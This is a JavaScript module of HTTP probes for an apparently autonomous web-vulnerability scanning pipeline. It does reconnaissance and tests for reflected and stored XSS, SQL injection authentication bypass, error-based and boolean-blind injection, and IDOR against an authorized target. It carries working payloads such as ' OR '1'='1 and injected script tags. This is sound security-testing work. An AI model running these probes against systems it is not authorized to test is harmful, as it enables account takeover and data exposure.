/**
 * httpProbes.js — built-in detection probes for the hunt pipeline.
 *
 * These are REAL tools in the ToolRegistry (no external binaries): they make
 * real HTTP requests against the hunt's authorized target and return JSON
 * with NORMALIZED finding candidates ({ type, severity, url, evidence,
 * confidence, source, title }) ready for the finding normalizer / lifecycle.
 *
 * They exist so the autonomous loop can drive recon → detect → find ENTIRELY
 * in-sandbox (no Kali, no nuclei/dalfox/sqlmap binaries, no LLM needed when
 * the deterministic strategy brain is active). Production hunts with a real
 * brain and Kali workers use the same registry entries.
 *
 * Safety: probes never execute for a target that failed policy/scope
 * validation — ToolExecutor enforces that BEFORE dispatching here. Redirects
 * are only followed within the target's own origin, and probes only speak
 * HTTP(S) to the single authorized base URL they were given.
 */

const DEFAULT_TIMEOUT_MS = 15_000;

/** Unique per-run marker so a reflection can't be confused with page text. */
export function probeMarker(prefix) {
  return `${prefix}${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`;
}

async function fetchTimed(url, options = {}, timeoutMs = DEFAULT_TIMEOUT_MS) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  const started = Date.now();
  try {
    const res = await fetch(url, { ...options, signal: ctrl.signal, redirect: 'manual' });
    const body = await res.text();
    return {
      status: res.status,
      headers: Object.fromEntries([...res.headers.entries()].map(([k, v]) => [k.toLowerCase(), v])),
      body,
      durationMs: Date.now() - started,
      url,
    };
  } finally {
    clearTimeout(timer);
  }
}

/** Follow at most one same-origin redirect (login flows use 302s). */
async function fetchSameOrigin(url, options = {}, timeoutMs = DEFAULT_TIMEOUT_MS) {
  const first = await fetchTimed(url, options, timeoutMs);
  if ([301, 302, 303, 307, 308].includes(first.status)) {
    const loc = first.headers.location;
    if (loc) {
      const next = new URL(loc, url);
      const base = new URL(url);
      if (next.origin === base.origin) {
        return fetchTimed(next.toString(), { ...options, method: 'GET' }, timeoutMs);
      }
    }
  }
  return first;
}

// ── Tiny HTML extractors (regex-based, no deps) ──────────────────────────

function extractForms(html, baseUrl) {
  const forms = [];
  for (const m of html.matchAll(/<form\b([^>]*)>([\s\S]*?)<\/form\s*>/gi)) {
    const attrs = m[1] || '';
    const inner = m[2] || '';
    const action = /action\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] || '';
    const method = (/method\s*=\s*["']([^"']*)["']/i.exec(attrs)?.[1] || 'get').toLowerCase();
    const inputs = [];
    for (const im of inner.matchAll(/<input\b([^>]*)\/?>/gi)) {
      const ia = im[1] || '';
      inputs.push({
        name: /name\s*=\s*["']([^"']*)["']/i.exec(ia)?.[1] || null,
        type: (/type\s*=\s*["']([^"']*)["']/i.exec(ia)?.[1] || 'text').toLowerCase(),
      });
    }
    let resolved = action;
    try {
      resolved = new URL(action || '', baseUrl).toString();
    } catch {
      /* keep raw */
    }
    forms.push({ action: resolved, method, inputs: inputs.filter(i => i.name) });
  }
  return forms;
}

function extractLinks(html, baseUrl) {
  const links = new Set();
  for (const m of html.matchAll(
    /<(?:a|link|script|img|iframe)\b[^>]*(?:href|src)\s*=\s*["']([^"'#]+)["']/gi
  )) {
    const raw = m[1];
    if (/^(javascript|mailto|data):/i.test(raw)) continue;
    try {
      const u = new URL(raw, baseUrl);
      const base = new URL(baseUrl);
      if (u.origin === base.origin) links.add(u.pathname + u.search);
    } catch {
      /* skip */
    }
  }
  return [...links];
}

function queryParamsOf(paths) {
  const params = new Map(); // path → [param names]
  for (const p of paths) {
    try {
      const u = new URL(p, 'http://x');
      const names = [...u.searchParams.keys()];
      if (names.length) params.set(u.pathname, names);
    } catch {
      /* skip */
    }
  }
  return [...params.entries()].map(([path, names]) => ({ path, params: names }));
}

function techHints(headers, html) {
  const hints = [];
  if (headers['x-powered-by']) hints.push(`x-powered-by: ${headers['x-powered-by']}`);
  if (headers.server) hints.push(`server: ${headers.server}`);
  const gen = /<meta\b[^>]*name\s*=\s*["']generator["'][^>]*content\s*=\s*["']([^"']+)["']/i.exec(
    html
  )?.[1];
  if (gen) hints.push(`generator: ${gen}`);
  return hints;
}

// ── Tool 1: web_probe — HTTP fingerprint + attack-surface discovery ──────

/**
 * Web Probe.
 * @param {object} options - Named options.
 * @returns {Promise<*>} Resolves when complete.
 */
export async function webProbe({ baseUrl, timeoutMs = DEFAULT_TIMEOUT_MS } = {}) {
  const started = Date.now();
  const home = await fetchSameOrigin(baseUrl, {}, timeoutMs);
  const forms = extractForms(home.body, baseUrl);
  const links = extractLinks(home.body, baseUrl);
  const queryParams = queryParamsOf(links);
  const endpoints = [
    ...new Set([
      ...forms.map(f => {
        try {
          return new URL(f.action).pathname;
        } catch {
          return f.action;
        }
      }),
      ...links.map(l => l.split('?')[0]),
    ]),
  ];
  return {
    tool: 'web_probe',
    baseUrl,
    status: home.status,
    techHints: techHints(home.headers, home.body),
    forms,
    links,
    queryParams,
    endpoints,
    findings: [],
    durationMs: Date.now() - started,
  };
}

// ── Tool 2: xss_probe — reflected XSS via discovered params/forms ────────

/**
 * Xss Probe.
 * @returns {Promise<*>} Resolves when complete.
 */
export async function xssProbe({
  baseUrl,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const checks = [];
  const findings = [];
  const seen = new Set();

  const testReflection = async url => {
    if (seen.has(url)) return;
    seen.add(url);
    const marker = probeMarker('dmx');
    const payload = `<script>dmxss('${marker}')</script>`;
    let probeUrl;
    try {
      const u = new URL(url, baseUrl);
      u.searchParams.set(u.searchParams.keys().next().value || 'q', payload);
      probeUrl = u.toString();
    } catch {
      return;
    }
    const res = await fetchTimed(probeUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
    const check = { url: probeUrl, status: res.status ?? null };
    if (!res.error && typeof res.body === 'string' && res.body.includes(payload)) {
      check.reflected = true;
      const param = (() => {
        try {
          return [...new URL(probeUrl).searchParams.keys()][0];
        } catch {
          return '?';
        }
      })();
      findings.push({
        type: 'reflected-xss',
        title: `Reflected XSS in GET ${safePath(probeUrl)} parameter '${param}'`,
        severity: 'high',
        url: probeUrl,
        evidence: {
          request: `GET ${safePath(probeUrl)}?${param}=<payload>`,
          payload,
          responseSnippet: snippetAround(res.body, payload),
          note: 'Payload reflected unescaped into the HTML response — executes in a victim browser.',
        },
        confidence: 0.95,
        source: 'xss_probe',
      });
    } else {
      check.reflected = false;
      if (res.error) check.error = res.error;
    }
    checks.push(check);
  };

  // From recon: links/forms that carry query params.
  const candidates = new Set();
  if (recon) {
    for (const qp of recon.queryParams || []) {
      for (const p of qp.params) candidates.add(`${baseUrl.replace(/\/$/, '')}${qp.path}?${p}=1`);
    }
    for (const f of recon.forms || []) {
      if (f.method === 'get') {
        const first = f.inputs[0]?.name;
        if (first) candidates.add(`${f.action}?${first}=1`);
      }
    }
  }
  // Always probe the two most common reflection points even without recon.
  candidates.add(`${baseUrl.replace(/\/$/, '')}/search?q=1`);
  candidates.add(`${baseUrl.replace(/\/$/, '')}/?q=1`);

  for (const c of [...candidates].slice(0, 12)) {
    await testReflection(c);
  }
  return { tool: 'xss_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── Tool 3: sqli_probe — auth-bypass + error-based SQL injection ─────────

/**
 * Sqli Probe.
 * @returns {Promise<*>} Resolves when complete.
 */
export async function sqliProbe({
  baseUrl,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const checks = [];
  const findings = [];
  const origin = baseUrl.replace(/\/$/, '');

  // Discover a login endpoint from recon forms (password input), else /login.
  let loginPath = '/login';
  if (recon) {
    const loginForm = (recon.forms || []).find(f => f.inputs.some(i => i.type === 'password'));
    if (loginForm) {
      try {
        loginPath = new URL(loginForm.action).pathname;
      } catch {
        /* keep default */
      }
    }
  }
  const loginUrl = `${origin}${loginPath}`;

  // 1. Classic auth bypass: ' OR '1'='1
  const bypassBody = JSON.stringify({ username: `' OR '1'='1`, password: probeMarker('x') });
  const bypass = await fetchTimed(
    loginUrl,
    {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: bypassBody,
    },
    timeoutMs
  ).catch(e => ({ error: e.message }));
  checks.push({ test: 'auth-bypass', url: loginUrl, status: bypass.status ?? null });
  const bypassJson = tryJson(bypass.body);
  if (
    !bypass.error &&
    bypass.status === 200 &&
    (bypassJson?.ok === true || /welcome|dashboard|logout/i.test(bypass.body || ''))
  ) {
    findings.push({
      type: 'sql-injection',
      title: `SQL injection in POST ${loginPath} — authentication bypass`,
      severity: 'critical',
      url: loginUrl,
      evidence: {
        request: `POST ${loginPath} {"username":"' OR '1'='1","password":"…"}`,
        responseSnippet: String(bypass.body || '').slice(0, 800),
        debugQuery: bypassJson?.debugQuery || null,
        note: 'Injected username short-circuited the password check — logged in without valid credentials.',
      },
      confidence: 0.95,
      source: 'sqli_probe',
    });
  }

  // 2. Error-based: a lone quote should never leak SQL syntax to the client.
  const errBody = JSON.stringify({ username: `'`, password: probeMarker('x') });
  const errRes = await fetchTimed(
    loginUrl,
    {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: errBody,
    },
    timeoutMs
  ).catch(e => ({ error: e.message }));
  checks.push({ test: 'error-based', url: loginUrl, status: errRes.status ?? null });
  if (
    !errRes.error &&
    /sql syntax|sqlite|mysql|pg_|ora-|odbc|unclosed quotation/i.test(errRes.body || '')
  ) {
    findings.push({
      type: 'sql-injection',
      title: `SQL injection in POST ${loginPath} — database error disclosure`,
      severity: 'medium',
      url: loginUrl,
      evidence: {
        request: `POST ${loginPath} {"username":"'","password":"…"}`,
        responseSnippet: String(errRes.body || '').slice(0, 800),
        note: 'A single quote triggers a database error message — user input reaches the SQL query unsanitized.',
      },
      confidence: 0.85,
      source: 'sqli_probe',
    });
  }

  // 3. Boolean probe on a numeric id param if recon found one (e.g. /user?id=).
  if (recon) {
    for (const qp of recon.queryParams || []) {
      for (const p of qp.params) {
        const base = `${origin}${qp.path}?${p}=1`;
        const t1 = await fetchTimed(`${base}' AND '1'='1`, {}, timeoutMs).catch(() => null);
        const t2 = await fetchTimed(`${base}' AND '1'='2`, {}, timeoutMs).catch(() => null);
        if (t1 && t2 && t1.body !== t2.body) {
          checks.push({ test: 'boolean-blind', url: base, differentResponses: true });
          findings.push({
            type: 'sql-injection',
            title: `SQL injection in GET ${qp.path} parameter '${p}' — boolean-based blind`,
            severity: 'high',
            url: base,
            evidence: {
              requestTrue: `${qp.path}?${p}=1' AND '1'='1`,
              requestFalse: `${qp.path}?${p}=1' AND '1'='2`,
              note: 'True/false payloads produce different responses — the parameter is injectable.',
            },
            confidence: 0.9,
            source: 'sqli_probe',
          });
        } else {
          checks.push({ test: 'boolean-blind', url: base, differentResponses: false });
        }
        break; // one param per path is enough
      }
    }
  }

  return {
    tool: 'sqli_probe',
    baseUrl,
    loginPath,
    checks,
    findings,
    durationMs: Date.now() - started,
  };
}

// ── Tool 4: stored_xss_probe — persist a payload, verify it renders ──────

/**
 * Stored Xss Probe.
 * @returns {Promise<*>} Resolves when complete.
 */
export async function storedXssProbe({
  baseUrl,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const checks = [];
  const findings = [];
  const origin = baseUrl.replace(/\/$/, '');

  // Discover comment-ish endpoints from recon, else the common conventions.
  const candidates = [];
  if (recon) {
    for (const ep of recon.endpoints || []) {
      if (/comment|guestbook|feedback|review/i.test(ep)) candidates.push(ep);
    }
  }
  candidates.push('/api/comments', '/comments', '/guestbook');

  const marker = probeMarker('dms');
  const payload = `<script>dmstored('${marker}')</script>`;
  for (const ep of [...new Set(candidates)].slice(0, 4)) {
    const postUrl = `${origin}${ep}`;
    const res = await fetchTimed(
      postUrl,
      {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ author: 'dm-probe', text: payload, comment: payload }),
      },
      timeoutMs
    ).catch(e => ({ error: e.message }));
    checks.push({
      test: 'store',
      url: postUrl,
      status: res.status ?? null,
      error: res.error || null,
    });
    if (res.error || ![200, 201, 202, 204, 303].includes(res.status)) continue;

    // Read back from the likely render endpoints.
    for (const view of [...new Set([ep, '/comments', '/guestbook'])].slice(0, 3)) {
      const viewUrl = `${origin}${view}`;
      const page = await fetchTimed(viewUrl, {}, timeoutMs).catch(e => ({ error: e.message }));
      if (!page.error && typeof page.body === 'string' && page.body.includes(payload)) {
        findings.push({
          type: 'stored-xss',
          title: `Stored XSS via POST ${ep} — payload persists and renders unescaped`,
          severity: 'high',
          url: viewUrl,
          evidence: {
            request: `POST ${ep} {"author":"dm-probe","text":"<payload>"}`,
            payload,
            renderUrl: viewUrl,
            responseSnippet: snippetAround(page.body, payload),
            note: 'The payload is stored server-side and rendered raw for every visitor — persistent script execution.',
          },
          confidence: 0.95,
          source: 'stored_xss_probe',
        });
        break;
      }
    }
    if (findings.length) break;
  }
  return { tool: 'stored_xss_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── Tool 5: idor_probe — missing authorization on object references ──────

const SENSITIVE_KEYS = ['password', 'ssn', 'secret', 'token', 'email', 'phone'];

/**
 * Idor Probe.
 * @returns {Promise<*>} Resolves when complete.
 */
export async function idorProbe({
  baseUrl,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const checks = [];
  const findings = [];
  const origin = baseUrl.replace(/\/$/, '');

  // Discover /resource/:id style links from recon (e.g. /api/users/1).
  const idLinks = new Map(); // base pattern → example full path
  const consider = path => {
    const m = /^(.+\/)(\d+)(\/.*)?$/.exec(path);
    if (m) idLinks.set(`${m[1]}:id${m[3] || ''}`, path);
  };
  if (recon) for (const l of recon.links || []) consider(l.split('?')[0]);
  consider('/api/users/1'); // convention fallback

  for (const [pattern, example] of [...idLinks.entries()].slice(0, 4)) {
    const ids = [1, 2];
    const got = [];
    for (const id of ids) {
      const url = `${origin}${pattern.replace(':id', String(id))}`;
      const res = await fetchTimed(url, {}, timeoutMs).catch(e => ({ error: e.message }));
      got.push({
        id,
        url,
        status: res.status ?? null,
        body: res.body || '',
        error: res.error || null,
      });
    }
    const [a, b] = got;
    checks.push({ test: 'idor', pattern, a: a.status, b: b.status });
    const ja = tryJson(a.body);
    const jb = tryJson(b.body);
    const sensitiveA = ja ? SENSITIVE_KEYS.filter(k => ja[k] != null && ja[k] !== '') : [];
    const sensitiveB = jb ? SENSITIVE_KEYS.filter(k => jb[k] != null && jb[k] !== '') : [];
    if (
      a.status === 200 &&
      b.status === 200 &&
      sensitiveA.length &&
      sensitiveB.length &&
      String(ja.id ?? ja.username) !== String(jb.id ?? jb.username)
    ) {
      findings.push({
        type: 'idor',
        title: `IDOR: GET ${pattern} returns other users' records without authorization`,
        severity: 'high',
        url: b.url,
        evidence: {
          requestA: `GET ${pattern.replace(':id', '1')} → 200 (user ${ja.username ?? ja.id})`,
          requestB: `GET ${pattern.replace(':id', '2')} → 200 (user ${jb.username ?? jb.id})`,
          disclosedFields: [...new Set([...sensitiveA, ...sensitiveB])],
          note: "No authentication or ownership check: requesting another object id returns that user's sensitive record.",
        },
        confidence: 0.9,
        source: 'idor_probe',
      });
    }
  }
  return { tool: 'idor_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── helpers ──────────────────────────────────────────────────────────────

function tryJson(text) {
  if (!text) return null;
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function safePath(url) {
  try {
    const u = new URL(url);
    return u.pathname;
  } catch {
    return url;
  }
}

function snippetAround(body, needle, radius = 160) {
  const i = String(body).indexOf(needle);
  if (i < 0) return String(body).slice(0, 400);
  return String(body).slice(Math.max(0, i - radius), i + needle.length + radius);
}

/** Dispatch table used by ToolExecutor.executeBuiltIn. */
export const HTTP_PROBES = Object.freeze({
  web_probe: webProbe,
  xss_probe: xssProbe,
  sqli_probe: sqliProbe,
  stored_xss_probe: storedXssProbe,
  idor_probe: idorProbe,
});
